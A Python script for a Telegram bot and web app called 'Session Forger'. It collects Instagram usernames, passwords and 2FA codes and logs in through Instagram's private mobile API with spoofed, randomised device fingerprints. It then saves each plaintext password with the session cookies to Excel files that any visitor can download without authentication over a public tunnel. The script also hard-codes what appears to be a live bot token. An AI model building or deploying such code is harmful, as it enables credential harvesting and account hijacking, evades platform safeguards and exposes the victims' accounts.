import sys
import os
import subprocess
import time
import logging
import json
import threading
import signal
import uuid
import secrets
import random
import shutil
import re
from typing import Optional
from urllib.parse import urlencode

# --- Configuration ---
BOT_TOKEN = "8591242778:AAHpyMLfltgl5ufLfI8f0QAyBklm_Kn3Q4I"
PORT = 8000
DATA_DIR = "data"

# Logging Setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("session_bot.log", mode='a')
    ]
)
logger = logging.getLogger(__name__)

# --- Runtime Dependency Check ---
REQUIRED_PACKAGES = [
    "fastapi", "uvicorn", "instaloader", "pandas", "openpyxl",
    "python-multipart", "pyTelegramBotAPI", "requests"
]

def install_dependencies():
    for package in REQUIRED_PACKAGES:
        try:
            # Map package names to import names
            import_name = package
            if package == "pyTelegramBotAPI": import_name = "telebot"
            if package == "python-multipart": import_name = "multipart"

            if package == "python-multipart":
                 try:
                     import python_multipart
                 except ImportError:
                     raise ImportError
            else:
                 __import__(import_name)

        except ImportError:
            logger.info(f"📦 Package '{package}' not found. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                logger.info(f"✅ '{package}' installed successfully.")
            except Exception as e:
                logger.error(f"Failed to install {package}: {e}")

install_dependencies()

# Imports after installation
import telebot
from telebot.types import MenuButtonWebApp, WebAppInfo
import instaloader # Still needed for excel/cookie utils if we want to reuse them, but login is replaced
from fastapi import FastAPI, Request, UploadFile, Form, HTTPException, File
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import requests
import pandas as pd

# --- Global State ---
pending_logins = {} # { "session_token": { "instance": InstagramObject, "username": str, ... } }

# --- Custom Instagram API Class ---
class Instagram:
    def __init__(self, username: str, password: str) -> None: #L7N
        self.username = username
        self.password = password
        self.session = requests.Session()
        rnd = str(random.randint(150, 999))
        self.Blockversion = secrets.token_hex(16)
        self.IgFamilyDeviceId = uuid.uuid4()
        self.AndroidID = f'android-{secrets.token_hex(8)}'
        self.IgDeviceId = uuid.uuid4()
        self.PigeonSession = f'UFS-{uuid.uuid4()}-0'
        # Fixed App ID for stability or use random as provided
        self.App = ''.join(random.choices('1234567890', k=15))
        self.user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111,999))+ ")"
        self.two_factor_identifier = None # Store 2FA ID

    def tokens(self) -> str:
        data = urlencode({
            'device_id': str(self.AndroidID),
            'custom_device_id': str(self.IgDeviceId),
        })

        headers = {
            'X-Pigeon-Session-Id': str(self.PigeonSession),
            'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
            'X-Ig-Bandwidth-Speed-Kbps': f'{random.randint(1000, 9999)}.000',
            'X-Ig-Bandwidth-Totalbytes-B': str(random.randint(10000000, 99999999)),
            'X-Ig-Bandwidth-Totaltime-Ms': str(random.randint(10000, 99999)),
            'X-Bloks-Version-Id': str(self.Blockversion),
            'X-Ig-Device-Id': str(self.IgDeviceId),
            'X-Ig-Android-Id': str(self.AndroidID),
            'User-Agent': self.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }

        try:
            self.session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
        except Exception:
            pass

        headers['X-Ig-Family-Device-Id'] = str(self.IgFamilyDeviceId)

        try:
            self.session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
        except Exception:
            pass

        data2 = f'signed_body=SIGNATURE.%7B%22phone_id%22%3A%22{self.IgFamilyDeviceId}%22%2C%22usage%22%3A%22prefill%22%7D'

        try:
            self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/contact_point_prefill/',
                headers=headers, data=data2)
        except Exception:
            pass

        data3 = urlencode({
            'signed_body': 'SIGNATURE.{"bool_opt_policy":"0","mobileconfigsessionless":"","api_version":"3","unit_type":"1","query_hash":"1fe1eeee83cc518f2c8b41f7deae1808ffe23a2fed74f1686f0ab95bbda55a0b","device_id":"'
            + str(self.IgDeviceId) + '","fetch_type":"ASYNC_FULL","family_device_id":"' + str(self.IgFamilyDeviceId).upper() + '"}'
        })

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/launcher/mobileconfig/',
                headers=headers, data=data3)
            return response.headers.get('ig-set-x-mid')
        except Exception:
            return None

    def login(self):
        mid = self.tokens()
        if not mid:
            return {"status": "error", "message": "Failed to generate tokens"}

        payload_json = json.dumps({
            "_csrftoken": "missing",
            "adid": str(self.IgFamilyDeviceId),
            "country_codes": [{"country_code": "7", "source": ["default", "uig_via_phone_id"]}],
            "device_id": str(self.AndroidID),
            "google_tokens": [],
            "guid": str(self.IgDeviceId),
            "login_attempt_count": 0,
            "jazoest": str(random.randint(11111, 55555)),
            "phone_id": str(self.IgDeviceId),
            "username": str(self.username),
            "enc_password": f"#PWD_INSTAGRAM:0:{round(time.time(), 3)}:{self.password}"
        })

        data = {
            "signed_body": f"SIGNATURE.{payload_json}"
        }

        headers = {
            'User-Agent': str(self.user_agent),
            'x-pigeon-session-id': str(self.PigeonSession),
            'x-ig-bandwidth-speed-kbps': str(random.randint(10000000, 99999999)),
            'x-bloks-version-id': str(self.Blockversion),
            'x-ig-device-id': str(self.IgDeviceId),
            'x-ig-bandwidth-totaltime-ms': str(random.randint(10000, 99999)),
            'x-ig-app-id': str(self.App),
            'x-mid': str(mid),
            'x-pigeon-rawclienttime': str(round(time.time(), 3)),
            'x-ig-bandwidth-totalbytes-b': str(random.randint(10000000, 99999999)),
            'x-ig-android-id': str(self.AndroidID),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/login/',
                headers=headers, data=data)

            resp_json = response.json()

            if response.status_code == 200 and "logged_in_user" in resp_json:
                return {"status": "success", "data": resp_json}

            if "two_factor_required" in resp_json:
                self.two_factor_identifier = resp_json["two_factor_info"]["two_factor_identifier"]
                return {"status": "2fa_required", "message": "Two-factor authentication required."}

            if "challenge" in resp_json:
                 challenge_url = resp_json.get("challenge", {}).get("url", "")
                 return {
                     "status": "challenge_required",
                     "message": "Checkpoint challenge required.",
                     "challenge_url": challenge_url
                 }

            if "message" in resp_json:
                # Capture full error object for better reporting
                return {"status": "fail", "message": resp_json["message"], "raw": resp_json}

            return {"status": "fail", "message": "Unknown error", "raw": resp_json}

        except Exception as e:
            return {"status": "error", "message": str(e)}

    def two_factor_login(self, code):
        if not self.two_factor_identifier:
            return {"status": "error", "message": "No 2FA identifier found."}

        data = {
            "signed_body": f"SIGNATURE." + json.dumps({
                "verification_code": code,
                "two_factor_identifier": self.two_factor_identifier,
                "username": self.username,
                "device_id": str(self.AndroidID),
                "guid": str(self.IgDeviceId),
            })
        }

        headers = {
            'User-Agent': self.user_agent,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        try:
            response = self.session.post(
                'https://b.i.instagram.com/api/v1/accounts/two_factor_login/',
                headers=headers, data=data
            )
            resp_json = response.json()

            if response.status_code == 200 and "logged_in_user" in resp_json:
                 return {"status": "success", "data": resp_json}

            return {"status": "fail", "message": resp_json.get("message", "2FA Failed")}
        except Exception as e:
             return {"status": "error", "message": str(e)}


# --- Telegram Bot Setup ---
bot = telebot.TeleBot(BOT_TOKEN)
tunnel_url = None

@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    if not tunnel_url:
        bot.send_message(chat_id, "⚠️ System is starting up. Please wait...")
        return

    # Add user_id to the URL for reporting
    web_app_url = f"{tunnel_url}?user_id={chat_id}"

    try:
        web_app_info = WebAppInfo(url=web_app_url)
        # Fix: Explicitly pass type='web_app'
        menu_button = MenuButtonWebApp(type='web_app', text="Open App", web_app=web_app_info)
        bot.set_chat_menu_button(chat_id, menu_button)
    except Exception as e:
        logger.error(f"Failed to set menu button: {e}")

    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("Open Web App", web_app=web_app_info))

    bot.send_message(
        chat_id,
        "🚀 *Welcome to the Session Manager*\n\nClick the button below to access the secure dashboard.",
        parse_mode="Markdown",
        reply_markup=markup
    )

# --- FastAPI Setup ---
app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Ensure data directory
os.makedirs(DATA_DIR, exist_ok=True)

# HTML Template (Cyberpunk + File Manager + Live Logs + Screenshot)
HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Session Forger</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Poppins:wght@300;400;600&family=Fira+Code:wght@400&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Poppins', sans-serif; background-color: #0f172a; color: #e2e8f0; }
        h1, h2, h3 { font-family: 'Orbitron', sans-serif; }
        .cyber-input {
            background: #1e293b; border: 1px solid #334155; color: #fff;
            transition: all 0.3s;
        }
        .cyber-input:focus {
            border-color: #0ea5e9; box-shadow: 0 0 10px rgba(14, 165, 233, 0.5);
        }
        .cyber-btn {
            background: linear-gradient(45deg, #0ea5e9, #6366f1);
            color: white; font-weight: bold; text-transform: uppercase;
            letter-spacing: 1px; transition: transform 0.2s, box-shadow 0.2s;
        }
        .cyber-btn:active { transform: scale(0.98); }
        .glass-panel {
            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        .file-item {
            background: rgba(51, 65, 85, 0.5); border: 1px solid rgba(255,255,255,0.05);
            transition: background 0.2s;
        }
        .file-item:hover { background: rgba(51, 65, 85, 0.8); }
        .loader {
            border: 3px solid #f3f3f3; border-top: 3px solid #3498db;
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Terminal Styling */
        .terminal-box {
            background: #000; border: 1px solid #333; color: #0f0;
            font-family: 'Fira Code', monospace; font-size: 10px;
            padding: 10px; border-radius: 6px; overflow-y: auto; max-height: 150px;
        }
        .term-error { color: #ff5555; }
        .term-info { color: #8be9fd; }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0f172a; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
    </style>
</head>
<body x-data="appData()" x-init="initApp()">

    <div class="min-h-screen flex flex-col items-center p-4 relative overflow-hidden" id="app-container">
        <!-- Background accents -->
        <div class="absolute top-[-10%] left-[-10%] w-64 h-64 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-64 h-64 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>

        <div class="w-full max-w-md glass-panel rounded-2xl p-6 shadow-2xl relative z-10 my-auto">

            <!-- Header -->
            <div class="text-center mb-6">
                <div class="w-16 h-16 mx-auto bg-gradient-to-tr from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-lg mb-3">
                     <img src="/api/bot-icon" class="w-14 h-14 rounded-full border-2 border-white" alt="Bot">
                </div>
                <h1 class="text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">
                    Session Forger
                </h1>
            </div>

            <!-- Tab Navigation -->
            <div class="flex space-x-2 mb-6 bg-slate-800 p-1 rounded-lg">
                <button @click="tab = 'create'" :class="{'bg-slate-600 text-white': tab === 'create', 'text-slate-400 hover:text-white': tab !== 'create'}" class="flex-1 py-2 text-xs font-bold rounded-md transition">NEW SESSION</button>
                <button @click="loadFiles()" :class="{'bg-slate-600 text-white': tab === 'files', 'text-slate-400 hover:text-white': tab !== 'files'}" class="flex-1 py-2 text-xs font-bold rounded-md transition">SAVED FILES</button>
            </div>

            <!-- CREATE SESSION TAB -->
            <div x-show="tab === 'create'" x-transition>

                <!-- Login Form -->
                <div x-show="step === 'login'">
                    <form @submit.prevent="submitLogin">
                        <div class="mb-4">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">INSTAGRAM USERNAME</label>
                            <input type="text" x-model="username" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="username" required>
                        </div>
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-blue-300">PASSWORD</label>
                            <input type="password" x-model="password" class="cyber-input w-full p-3 rounded-lg outline-none text-sm" placeholder="••••••••" required>
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                            <span x-show="!loading">Initialize Session</span>
                            <div x-show="loading" class="loader"></div>
                        </button>
                    </form>
                </div>

                <!-- Verification Form -->
                <div x-show="step === 'verify'" style="display: none;">
                    <div class="text-center mb-4">
                        <p class="text-xs text-yellow-400 font-semibold uppercase tracking-wider">Verification Required</p>
                        <p class="text-[10px] text-slate-400">Enter the code sent to your device (SMS/Email/App).</p>
                    </div>
                    <form @submit.prevent="submitVerification">
                        <div class="mb-6">
                            <label class="block text-[10px] font-bold mb-1 text-yellow-300">SECURITY CODE</label>
                            <input type="text" x-model="verificationCode" class="cyber-input w-full p-3 rounded-lg outline-none text-center text-xl tracking-widest font-mono" placeholder="000000" required>
                        </div>
                        <button type="submit" class="cyber-btn w-full p-3 rounded-lg shadow-lg flex justify-center items-center" :disabled="loading">
                            <span x-show="!loading">Verify & Save</span>
                            <div x-show="loading" class="loader"></div>
                        </button>
                    </form>
                </div>

                <!-- Success Message -->
                <div x-show="step === 'success'" style="display: none;" class="text-center py-4">
                    <div class="text-green-400 text-4xl mb-2">✅</div>
                    <h2 class="text-lg font-bold mb-1">Success!</h2>
                    <p class="text-xs text-slate-400 mb-4">Session generated and saved successfully.</p>
                    <button @click="resetForm" class="text-xs text-blue-400 hover:text-blue-300 underline">Create another</button>
                </div>

                <!-- Live Terminal / Error Box -->
                <div x-show="logs.length > 0" x-transition class="mt-6">
                    <p class="text-[10px] font-bold text-slate-500 mb-1">SYSTEM LOGS</p>
                    <div class="terminal-box">
                        <template x-for="(log, index) in logs" :key="index">
                            <div :class="{'term-error': log.type === 'error', 'term-info': log.type === 'info'}">
                                <span class="opacity-50" x-text="log.time"></span> <span x-text="log.msg"></span>
                            </div>
                        </template>
                    </div>
                </div>
            </div>

            <!-- FILES TAB -->
            <div x-show="tab === 'files'" x-transition style="display: none;">
                <div class="flex justify-between items-center mb-3">
                    <h3 class="text-xs font-bold text-slate-400">AVAILABLE SESSIONS</h3>
                    <button @click="loadFiles" class="text-xs text-blue-400 hover:text-blue-300">Refresh</button>
                </div>

                <div class="space-y-2 max-h-60 overflow-y-auto pr-1">
                    <template x-for="file in files" :key="file.name">
                        <div class="file-item p-3 rounded-lg flex justify-between items-center group">
                            <div class="flex items-center space-x-3 overflow-hidden">
                                <span class="text-lg">📄</span>
                                <div class="truncate">
                                    <p class="text-sm font-semibold text-slate-200 truncate" x-text="file.name"></p>
                                    <p class="text-[10px] text-slate-500" x-text="file.size"></p>
                                </div>
                            </div>
                            <!-- FIXED DOWNLOAD BUTTON: Opens in System Browser -->
                            <button @click="downloadFile(file.name)" class="p-2 bg-blue-600/20 text-blue-400 rounded hover:bg-blue-600 hover:text-white transition">
                                ↓
                            </button>
                        </div>
                    </template>
                    <div x-show="files.length === 0 && !loading" class="text-center py-8 text-slate-500 text-xs">
                        No files found.
                    </div>
                    <div x-show="loading && tab === 'files'" class="flex justify-center py-4">
                        <div class="loader"></div>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        function appData() {
            return {
                tab: 'create', // create | files
                step: 'login', // login | verify | success
                username: '',
                password: '',
                verificationCode: '',
                loading: false,
                sessionToken: '',
                userId: null,
                files: [],
                logs: [],

                initApp() {
                    if (window.Telegram && window.Telegram.WebApp) {
                        window.Telegram.WebApp.ready();
                        window.Telegram.WebApp.expand();
                    }
                    this.sessionToken = Math.random().toString(36).substring(2);

                    // Parse User ID from URL
                    const urlParams = new URLSearchParams(window.location.search);
                    this.userId = urlParams.get('user_id');
                },

                resetForm() {
                    this.step = 'login';
                    this.username = '';
                    this.password = '';
                    this.verificationCode = '';
                    this.logs = [];
                    this.sessionToken = Math.random().toString(36).substring(2);
                },

                addLog(msg, type='info') {
                    const time = new Date().toLocaleTimeString('en-US', {hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit'});
                    this.logs.push({time: `[${time}]`, msg, type});

                    this.$nextTick(() => {
                         const term = document.querySelector('.terminal-box');
                         if(term) term.scrollTop = term.scrollHeight;
                    });
                },

                async captureAndSendError(errorMsg) {
                    if (!this.userId) return; // Cannot send without user ID

                    try {
                        // Wait for logs to render
                        await new Promise(r => setTimeout(r, 500));

                        const canvas = await html2canvas(document.body);
                        canvas.toBlob(async (blob) => {
                            if (!blob) return;

                            const formData = new FormData();
                            formData.append('user_id', this.userId);
                            formData.append('error_msg', errorMsg);
                            formData.append('screenshot', blob, 'error.png');

                            await fetch('/api/report_error', {
                                method: 'POST',
                                body: formData
                            });
                        }, 'image/png');

                    } catch (e) {
                        console.error('Failed to report error:', e);
                    }
                },

                downloadFile(filename) {
                    const url = window.location.origin + '/api/download/' + encodeURIComponent(filename);
                    if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openLink) {
                        window.Telegram.WebApp.openLink(url, {try_instant_view: false});
                    } else {
                        window.open(url, '_blank');
                    }
                },

                async submitLogin() {
                    this.loading = true;
                    this.logs = []; // Clear previous logs
                    this.addLog(`Initializing session for ${this.username}...`);
                    this.addLog("Using Custom API Method...");

                    try {
                        const formData = new FormData();
                        formData.append('username', this.username);
                        formData.append('password', this.password);
                        formData.append('session_token', this.sessionToken);

                        const response = await fetch('/api/login', {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();

                        if (response.ok) {
                            if (data.status === '2fa_required') {
                                this.addLog("2FA Required. Waiting for input...", "info");
                                this.step = 'verify';
                            } else if (data.status === 'success') {
                                this.addLog("Session created successfully.", "info");
                                this.step = 'success';
                                this.loadFiles();
                            }
                        } else {
                            const errorDetail = data.detail || data.message || 'Unknown error';
                            this.addLog(`FAILED: ${errorDetail}`, "error");

                            // Check for challenge details
                            if (data.detail && data.detail.includes("challenge")) {
                                this.addLog("Challenge URL detected in backend logs (if available).", "info");
                            }

                            // Report error
                            this.captureAndSendError(errorDetail);
                        }
                    } catch (e) {
                        const msg = `NETWORK ERROR: ${e.message}`;
                        this.addLog(msg, "error");
                        this.captureAndSendError(msg);
                    } finally {
                        this.loading = false;
                    }
                },

                async submitVerification() {
                    this.loading = true;
                    this.addLog(`Submitting verification code...`);
                    try {
                        const formData = new FormData();
                        formData.append('code', this.verificationCode);
                        formData.append('session_token', this.sessionToken);

                        const response = await fetch('/api/verify_2fa', {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();

                        if (response.ok) {
                            this.addLog("Verification successful.", "info");
                            this.step = 'success';
                            this.loadFiles();
                        } else {
                            const errorDetail = data.detail || data.message || 'Verification failed';
                            this.addLog(`VERIFICATION FAILED: ${errorDetail}`, "error");
                            this.captureAndSendError(errorDetail);
                        }
                    } catch (e) {
                         const msg = `NETWORK ERROR: ${e.message}`;
                         this.addLog(msg, "error");
                         this.captureAndSendError(msg);
                    } finally {
                        this.loading = false;
                    }
                },

                async loadFiles() {
                    this.tab = 'files';
                    this.loading = true;
                    try {
                        const response = await fetch('/api/files');
                        if (response.ok) {
                            this.files = await response.json();
                        }
                    } catch (e) {
                        console.error('Error loading files', e);
                    } finally {
                        this.loading = false;
                    }
                }
            }
        }
    </script>
</body>
</html>
"""

@app.get("/")
async def get_index():
    return HTMLResponse(content=HTML_CONTENT)

@app.get("/api/bot-icon")
async def get_bot_icon():
    try:
        info = bot.get_me()
        photos = bot.get_user_profile_photos(info.id)
        if photos.total_count > 0:
            file_id = photos.photos[0][0].file_id
            file_info = bot.get_file(file_id)
            url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
            return RedirectResponse(url=url)
    except Exception as e:
        logger.error(f"Error fetching icon: {e}")
    return RedirectResponse(url="https://via.placeholder.com/150")

@app.get("/api/files")
async def list_files():
    files = []
    if os.path.exists(DATA_DIR):
        for f in os.listdir(DATA_DIR):
            if f.endswith(".xlsx"):
                path = os.path.join(DATA_DIR, f)
                size = os.path.getsize(path) / 1024
                files.append({
                    "name": f,
                    "size": f"{size:.1f} KB"
                })
    return JSONResponse(content=files)

@app.get("/api/download/{filename}")
async def download_file(filename: str):
    # Security check: filename shouldn't contain path traversal chars
    if ".." in filename or "/" in filename:
        raise HTTPException(status_code=400, detail="Invalid filename")

    file_path = os.path.join(DATA_DIR, filename)
    if os.path.exists(file_path) and filename.endswith(".xlsx"):
        return FileResponse(file_path, filename=filename)
    return HTTPException(status_code=404, detail="File not found")

@app.post("/api/report_error")
async def report_error(
    user_id: str = Form(...),
    error_msg: str = Form(...),
    screenshot: UploadFile = File(...)
):
    try:
        # Read the uploaded screenshot
        image_data = await screenshot.read()

        # Send to Telegram
        bot.send_photo(
            chat_id=user_id,
            photo=image_data,
            caption=f"⚠️ *Error Reported*\n\n`{error_msg}`\n\n_Screenshot attached._",
            parse_mode="Markdown"
        )
        return JSONResponse(content={"status": "sent"})
    except Exception as e:
        logger.error(f"Failed to report error: {e}")
        return JSONResponse(status_code=500, content={"detail": str(e)})

@app.post("/api/login")
async def api_login(
    username: str = Form(...),
    password: str = Form(...),
    session_token: str = Form(...)
):
    try:
        # Use custom Instagram class
        api = Instagram(username, password)
        result = api.login()

        if result["status"] == "success":
             save_session_custom(api, username, password)
             return JSONResponse(content={"status": "success"})

        elif result["status"] == "2fa_required":
             pending_logins[session_token] = {
                 "instance": api,
                 "username": username,
                 "password": password
             }
             return JSONResponse(content={"status": "2fa_required"})

        elif result["status"] == "challenge_required":
             # We return the detail so the frontend logs can show it
             msg = result["message"]
             if "challenge_url" in result and result["challenge_url"]:
                 msg += f" URL: {result['challenge_url']}"
             return JSONResponse(status_code=403, content={"detail": msg})

        else:
             return JSONResponse(status_code=401, content={"detail": result["message"]})

    except Exception as e:
        logger.exception(f"Login error for {username}")
        return JSONResponse(status_code=500, content={"detail": f"System Error: {e}"})

@app.post("/api/verify_2fa")
async def verify_2fa(
    code: str = Form(...),
    session_token: str = Form(...)
):
    if session_token not in pending_logins:
        raise HTTPException(status_code=400, detail="Session expired.")

    data = pending_logins[session_token]
    api = data["instance"]
    username = data["username"]
    password = data["password"]

    try:
        result = api.two_factor_login(code)

        if result["status"] == "success":
             save_session_custom(api, username, password)
             del pending_logins[session_token]
             return JSONResponse(content={"status": "success"})
        else:
             return JSONResponse(status_code=400, content={"detail": result["message"]})

    except Exception as e:
        logger.error(f"2FA failed for {username}: {e}")
        return JSONResponse(status_code=400, content={"detail": str(e)})

def save_session_custom(api_instance, username, password):
    os.makedirs(DATA_DIR, exist_ok=True)

    # Sanitize username for filename
    safe_username = re.sub(r'[\\/*?:"<>|]', "", username)

    # Extract cookies from the session
    cookies = "; ".join([f"{name}={value}" for name, value in api_instance.session.cookies.items()])

    # Save Excel
    excel_path = f"{DATA_DIR}/{safe_username}.xlsx"
    data = [{
        "Instagram ID": username,
        "Instagram Password": password,
        "Gmail": "",
        "Gmail Password": "",
        "Full Cookie String": cookies
    }]

    df = pd.DataFrame(data)
    if os.path.exists(excel_path):
        os.remove(excel_path)

    df.to_excel(excel_path, index=False)
    logger.info(f"Data saved for {username}")

# --- Tunneling ---
def start_tunnel():
    global tunnel_url
    time.sleep(3)

    # Cloudflared
    try:
        if not os.path.exists("./cloudflared"):
             arch = subprocess.check_output(["uname", "-m"]).decode().strip()
             url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
             if "arm" in arch or "aarch64" in arch:
                 url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"

             logger.info("Downloading Cloudflared...")
             subprocess.run(["wget", "-q", "-O", "cloudflared", url])
             subprocess.run(["chmod", "+x", "cloudflared"])

        logger.info("Starting Cloudflare Tunnel...")
        proc = subprocess.Popen(["./cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        start_time = time.time()
        while time.time() - start_time < 30:
            line = proc.stderr.readline()
            if "trycloudflare.com" in line:
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    tunnel_url = match.group(0)
                    logger.info(f"✅ Cloudflare Tunnel: {tunnel_url}")
                    return
            time.sleep(0.1)
    except Exception as e:
        logger.error(f"Cloudflared failed: {e}")

    # Fallback SSH
    try:
        logger.info("Attempting SSH Tunnel...")
        proc = subprocess.Popen(["ssh", "-R", f"80:localhost:{PORT}", "-o", "StrictHostKeyChecking=no", "nokey@localhost.run"],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        start_time = time.time()
        while time.time() - start_time < 20:
             line = proc.stdout.readline()
             if "lhr.life" in line or "localhost.run" in line:
                 match = re.search(r'https://[a-zA-Z0-9-]+\.lhr\.life', line)
                 if match:
                     tunnel_url = match.group(0)
                     logger.info(f"✅ SSH Tunnel: {tunnel_url}")
                     return
             time.sleep(0.1)
    except Exception as e:
        logger.error(f"SSH failed: {e}")

# --- Main ---
if __name__ == "__main__":
    threading.Thread(target=start_tunnel, daemon=True).start()

    def run_bot():
        while True:
            try:
                logger.info("Bot Polling...")
                bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
            except Exception as e:
                logger.error(f"Bot Polling Error: {e}")
                time.sleep(5)

    threading.Thread(target=run_bot, daemon=True).start()

    logger.info(f"Server starting on port {PORT}")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="error")
